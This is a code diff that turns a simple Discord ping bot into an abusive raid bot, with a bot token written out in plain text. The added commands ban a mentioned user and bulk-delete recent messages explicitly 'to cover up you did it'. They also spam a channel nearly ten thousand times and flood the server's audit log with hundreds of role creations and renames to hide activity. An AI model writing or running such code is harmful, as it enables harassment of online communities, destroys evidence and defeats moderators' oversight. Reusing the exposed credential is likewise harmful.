@@ -1,15 +1,46 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
+var Discord = require("discord.js");
+    bot = new Discord.Client();
+	pre = "^";
+	banMessage = "no";
 
-client.on('ready', () => {
-    console.log('I am ready!');
+/*Message Checker --
+	defines if a code is a valid command*/
+function cmd(str, msg) {
+	return msg.content.toLowerCase().startsWith(pre + str);
+}
+
+bot.on('ready', () => {
+	console.log('Login was successful hackerboi.\n' + 'Logged into: ' + bot.guilds.array());
 });
 
-client.on('message', message => {
-    if (message.content === 'ping') {
-    	message.reply('pong');
-  	}
-});
+bot.login("NDY1OTg1MzkyMzg3MDMxMDY3.DiVsVw.kYW0b34cueFrsPxFwYOxfp2pKtU");
 
-// THIS  MUST  BE  THIS  WAY
-client.login(process.env.NDY1OTg1MzkyMzg3MDMxMDY3.DiVsVw.kYW0b34cueFrsPxFwYOxfp2pKtU);
+bot.on("message", msg => {
+	//ban command
+	if(cmd("ban", msg)) {
+		msg.channel.fetchMessages({limit: 30}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
+		msg.guild.member(msg.mentions.users.first()).ban();
+		msg.mentions.users.first().send(banMessage); //messages bannee
+		msg.author.send(banMessage); //messages banner
+    }
+	//spam command
+	if(cmd("spam", msg)) {
+		msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
+		for (var i = 0; i < 9812; i++) {
+			msg.channel.send("Go Pokeball! YEET");
+		}
+	}
+	//audit log clogger
+	if(cmd("smokescreen", msg)) {
+		msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
+		for (var i = 0; i < 500; i++) {
+			// Creates new roles to clog up the audit log
+			msg.guild.createRole({
+				name: 'UUUUU',
+				color: 'BLUE',
+			});
+			//changes name tons of times to clog up the audit log
+			msg.guild.setName("SERVER "+ i + " TIMES");
+        }
+	}
+});
